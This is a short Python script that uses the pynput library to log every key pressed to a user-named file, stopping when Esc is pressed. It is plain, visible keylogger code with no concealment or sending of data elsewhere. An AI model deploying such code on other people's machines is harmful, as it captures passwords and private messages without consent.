from pynput import keyboard

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}\n")
    except AttributeError:
        if str(key) == "Key.space":
            with open(log_file, "a") as file:
                file.write(" \n")
        else:
            with open(log_file, "a") as file:
                file.write(f"{str(key)}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

log_file = input("Enter the path to save the log file (e.g., keylog.txt): ")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
